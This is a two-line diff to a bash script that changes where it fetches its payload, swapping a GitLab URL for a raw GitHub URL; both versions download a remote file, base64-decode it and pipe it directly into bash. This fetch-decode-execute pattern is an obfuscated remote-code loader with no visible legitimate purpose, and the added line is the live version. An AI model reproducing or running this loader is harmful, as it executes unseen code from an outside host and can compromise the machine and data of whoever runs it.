@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://gitlab.com/greywolf-group/greywolf-project/-/raw/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/ziggywelch307/welch/refs/heads/main/entrypoint.sh | base64 -d | bash
